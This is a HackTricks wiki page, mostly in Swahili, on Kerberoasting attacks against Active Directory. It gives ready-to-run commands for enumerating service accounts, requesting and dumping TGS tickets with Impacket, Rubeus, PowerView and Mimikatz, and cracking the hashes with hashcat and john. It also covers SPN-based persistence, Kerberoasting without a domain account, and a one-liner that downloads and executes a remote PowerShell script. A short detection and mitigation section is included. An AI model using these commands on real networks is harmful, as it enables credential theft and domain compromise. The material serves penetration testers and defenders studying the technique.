# Kerberoast

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) kujenga na **kujiendesha kiotomatiki** kazi zinazotumiwa na zana za jamii **zilizoendelea zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}

## Kerberoast

Kerberoasting inazingatia upatikanaji wa **TGS tiketi**, haswa zile zinazohusiana na huduma zinazofanya kazi chini ya **akaunti za watumiaji** katika **Active Directory (AD)**, ikiondoa **akaunti za kompyuta**. Uthibitisho wa tiketi hizi unatumia funguo zinazotokana na **nywila za watumiaji**, ikiruhusu uwezekano wa **kuvunja akidi za nje**. Matumizi ya akaunti ya mtumiaji kama huduma yanaonyeshwa na mali isiyo tupu ya **"ServicePrincipalName"**.

Ili kutekeleza **Kerberoasting**, akaunti ya kikoa inayoweza kuomba **TGS tiketi** ni muhimu; hata hivyo, mchakato huu hauhitaji **privilege maalum**, na hivyo inapatikana kwa mtu yeyote mwenye **akidi halali za kikoa**.

### Mambo Muhimu:

* **Kerberoasting** inalenga **TGS tiketi** za **huduma za akaunti za watumiaji** ndani ya **AD**.
* Tiketi zilizothibitishwa kwa funguo kutoka **nywila za watumiaji** zinaweza **kuvunjwa nje**.
* Huduma inatambulishwa na **ServicePrincipalName** ambayo si null.
* **Hakuna privilege maalum** zinazohitajika, ni lazima tu **akidi halali za kikoa**.

### **Shambulio**

{% hint style="warning" %}
**Zana za Kerberoasting** kwa kawaida huomba **`RC4 encryption`** wanapofanya shambulio na kuanzisha maombi ya TGS-REQ. Hii ni kwa sababu **RC4 ni** [**dhaifu**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) na rahisi kuvunjwa nje kwa kutumia zana kama Hashcat kuliko algorithimu nyingine za uthibitisho kama AES-128 na AES-256.\
Hashi za RC4 (aina 23) huanza na **`$krb5tgs$23$*`** wakati AES-256(aina 18) huanza na **`$krb5tgs$18$*`**.` 
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Vifaa vingi vinavyojumuisha dump ya watumiaji wanaoweza kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Tathmini watumiaji wanaoweza kuathiriwa na Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Technique 1: Omba TGS na uipakue kutoka kwa kumbukumbu**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Technique 2: Zana za kiotomatiki**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Wakati TGS inapoombwa, tukio la Windows `4769 - Tiketi ya huduma ya Kerberos iliombwa` inaundwa.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) kujenga na **kujiendesha kiotomatiki** kwa urahisi kwa kutumia zana za jamii **zilizoendelea zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### Kupasua
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistence

Ikiwa una **idhini ya kutosha** juu ya mtumiaji unaweza **kufanya iwe kerberoastable**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** ni kwa sababu ya wakati wako wa ndani, unahitaji kusawazisha mwenyeji na DC. Kuna chaguzi chache:

* `ntpdate <IP of DC>` - Imepitwa na wakati tangu Ubuntu 16.04
* `rdate -n <IP of DC>`

### Mitigation

Kerberoasting inaweza kufanywa kwa kiwango cha juu cha usiri ikiwa inaweza kutumika. Ili kugundua shughuli hii, umakini unapaswa kulipwa kwa **Security Event ID 4769**, ambayo inaonyesha kwamba tiketi ya Kerberos imeombwa. Hata hivyo, kutokana na mzunguko mkubwa wa tukio hili, filters maalum zinapaswa kutumika ili kutenga shughuli za kushuku:

* Jina la huduma halipaswi kuwa **krbtgt**, kwani hii ni ombi la kawaida.
* Majina ya huduma yanayomalizika na **$** yanapaswa kutengwa ili kuepuka kujumuisha akaunti za mashine zinazotumika kwa huduma.
* Maombi kutoka kwa mashine yanapaswa kuchujwa kwa kutengwa kwa majina ya akaunti yaliyoundwa kama **machine@domain**.
* Ni maombi tu ya tiketi yaliyofanikiwa yanapaswa kuzingatiwa, yanayotambulika kwa msimbo wa kushindwa wa **'0x0'**.
* **Muhimu zaidi**, aina ya usimbaji wa tiketi inapaswa kuwa **0x17**, ambayo mara nyingi hutumiwa katika mashambulizi ya Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
To mitigate the risk of Kerberoasting:

* Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
* Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.

By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.

## Kerberoast w/o domain account

In **Septemba 2022**, njia mpya ya kutumia mfumo ilifichuliwa na mtafiti anayeitwa Charlie Clark, iliyoshirikiwa kupitia jukwaa lake [exploit.ph](https://exploit.ph/). Njia hii inaruhusu kupata **Service Tickets (ST)** kupitia ombi la **KRB\_AS\_REQ**, ambalo kwa ajabu halihitaji udhibiti wa akaunti yoyote ya Active Directory. Kimsingi, ikiwa kiongozi ameanzishwa kwa njia ambayo haitaji uthibitisho wa awali—hali inayofanana na kile kinachojulikana katika ulimwengu wa usalama wa mtandao kama **AS-REP Roasting attack**—sifa hii inaweza kutumika kubadilisha mchakato wa ombi. Kwa haswa, kwa kubadilisha sifa ya **sname** ndani ya mwili wa ombi, mfumo unadanganywa kutoa **ST** badala ya Tiketi ya Kutoa Tiketi iliyosimbwa (TGT).

The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
You must provide a list of users because we don't have a valid account to query the LDAP using this technique.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus kutoka PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## References

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) kujenga na **kujiendesha kiotomatiki** kwa urahisi kwa kutumia zana za jamii **za kisasa zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
